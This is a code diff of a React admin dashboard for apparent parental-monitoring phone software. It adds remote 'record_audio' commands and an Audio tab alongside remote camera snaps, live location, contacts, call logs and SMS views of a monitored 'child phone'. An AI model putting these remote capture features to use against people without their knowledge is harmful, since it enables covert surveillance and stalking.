@@ -5,16 +5,9 @@ import React, { useEffect, useState, useCallback } from "react";
 import { useParams } from "next/navigation";
 import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage } from "@/lib/device-types";
 import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
-import { DeviceMapTracker } from "@/components/admin/devices/DeviceMapTracker";
-import { DeviceCameraGallery } from "@/components/admin/devices/DeviceCameraGallery";
-import { DeviceContactsTable } from "@/components/admin/devices/DeviceContactsTable";
-import { DeviceCallLogsList } from "@/components/admin/devices/DeviceCallLogsList";
-import { DeviceMessagesFeed } from "@/components/admin/devices/DeviceMessagesFeed";
-import { DeviceAppsTab } from "@/components/admin/devices/DeviceAppsTab";
-import { DeviceBrowsingTab } from "@/components/admin/devices/DeviceBrowsingTab";
-import { DeviceFilesTab } from "@/components/admin/devices/DeviceFilesTab";
-import { DeviceLiveStreamTab } from "@/components/admin/devices/DeviceLiveStreamTab";
-import { MapPin, Camera, User, Phone, MessageSquare, Radio, Layers, Globe, Folder } from "lucide-react";
+import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
+import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
+import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic } from "lucide-react";
 
 export default function DeviceDetailPage() {
   const params = useParams();
@@ -26,10 +19,15 @@ export default function DeviceDetailPage() {
   const [calls, setCalls] = useState<DeviceCall[]>([]);
   const [messages, setMessages] = useState<DeviceMessage[]>([]);
   const [captures, setCaptures] = useState<any[]>([]);
-  const [activeTab, setActiveTab] = useState<
-    "map" | "stream" | "camera" | "apps" | "browsing" | "files" | "contacts" | "calls" | "messages"
-  >("map");
+  const [audioClips, setAudioClips] = useState<AudioCapture[]>([]);
+  const [activeTab, setActiveTab] = useState("map");
   const [loading, setLoading] = useState(true);
+  const [toast, setToast] = useState<string | null>(null);
+
+  const showToast = (msg: string) => {
+    setToast(msg);
+    setTimeout(() => setToast(null), 3500);
+  };
 
   const fetchDeviceData = useCallback(async () => {
     if (!deviceId) return;
@@ -49,11 +47,11 @@ export default function DeviceDetailPage() {
       if (callRes.calls) setCalls(callRes.calls);
       if (msgRes.messages) setMessages(msgRes.messages);
       if (cmdRes.commands) {
-        const photoCommands = cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path);
-        setCaptures(photoCommands);
+        setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
+        setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
       }
     } catch (err) {
-      console.error("Error loading device telemetry", err);
+      console.error("Error loading telemetry", err);
     } finally {
       setLoading(false);
     }
@@ -65,13 +63,19 @@ export default function DeviceDetailPage() {
     return () => clearInterval(interval);
   }, [fetchDeviceData]);
 
-  const handleTriggerSnap = async (camera: "front" | "back") => {
+  const sendCommand = async (command: string, payload = {}, label = "Command") => {
     await fetch(`/api/devices/${deviceId}/commands`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ command: "take_photo", payload: { camera } }),
+      body: JSON.stringify({ command, payload }),
     });
-    alert(`📸 ${camera === "front" ? "Front" : "Back"} camera snap command sent to child's phone!`);
+    showToast(`⚡ ${label} sent to child phone!`);
+    fetchDeviceData();
+  };
+
+  const handleDeleteCommand = async (cmdId: string) => {
+    await fetch(`/api/devices/${deviceId}/commands?command_id=${cmdId}`, { method: "DELETE" });
+    showToast("🗑️ Item deleted successfully!");
     fetchDeviceData();
   };
 
@@ -89,11 +93,9 @@ export default function DeviceDetailPage() {
 
   const TABS = [
     { id: "map", label: "Live Map", icon: MapPin },
-    { id: "stream", label: "Live Stream 🔴", icon: Radio },
-    { id: "apps", label: "App Usage", icon: Layers },
-    { id: "browsing", label: "Browsing", icon: Globe },
-    { id: "files", label: "Gallery & Files", icon: Folder },
     { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
+    { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
+    { id: "apps", label: "Apps", icon: Layers },
     { id: "contacts", label: `Contacts (${contacts.length})`, icon: User },
     { id: "calls", label: `Calls (${calls.length})`, icon: Phone },
     { id: "messages", label: `SMS (${messages.length})`, icon: MessageSquare },
@@ -101,6 +103,12 @@ export default function DeviceDetailPage() {
 
   return (
     <div className="space-y-6 pb-20 md:pb-8">
+      {toast && (
+        <div className="fixed top-6 right-6 z-50 py-3 px-5 rounded-2xl bg-black/90 border border-[#FFFC00]/40 text-[#FFFC00] text-xs font-bold shadow-2xl backdrop-blur-xl flex items-center gap-2">
+          <span>{toast}</span>
+        </div>
+      )}
+
       <DeviceDetailHeader device={device} onRefresh={fetchDeviceData} />
 
       {/* Tabs */}
@@ -108,7 +116,7 @@ export default function DeviceDetailPage() {
         {TABS.map(({ id, label, icon: Icon }) => (
           <button
             key={id}
-            onClick={() => setActiveTab(id as any)}
+            onClick={() => setActiveTab(id)}
             className={`flex items-center gap-2 py-2.5 px-3.5 rounded-xl text-xs font-bold transition-all shrink-0 ${
               activeTab === id
                 ? "bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black shadow-md"
@@ -121,18 +129,18 @@ export default function DeviceDetailPage() {
         ))}
       </div>
 
-      {/* Tab Content */}
-      <div className="p-5 rounded-3xl bg-white dark:bg-[#0B0B0E] border border-slate-200 dark:border-white/10 shadow-xl transition-colors">
-        {activeTab === "map" && <DeviceMapTracker locations={locations} childName={device.child_name} />}
-        {activeTab === "stream" && <DeviceLiveStreamTab deviceId={deviceId} childName={device.child_name} />}
-        {activeTab === "apps" && <DeviceAppsTab deviceId={deviceId} />}
-        {activeTab === "browsing" && <DeviceBrowsingTab deviceId={deviceId} />}
-        {activeTab === "files" && <DeviceFilesTab deviceId={deviceId} />}
-        {activeTab === "camera" && <DeviceCameraGallery captures={captures} onTriggerSnap={handleTriggerSnap} />}
-        {activeTab === "contacts" && <DeviceContactsTable contacts={contacts} />}
-        {activeTab === "calls" && <DeviceCallLogsList calls={calls} />}
-        {activeTab === "messages" && <DeviceMessagesFeed messages={messages} />}
-      </div>
+      <DeviceTabViews
+        activeTab={activeTab}
+        device={device}
+        locations={locations}
+        contacts={contacts}
+        calls={calls}
+        messages={messages}
+        captures={captures}
+        audioClips={audioClips}
+        onSendCommand={sendCommand}
+        onDeleteCommand={handleDeleteCommand}
+      />
     </div>
   );
 }
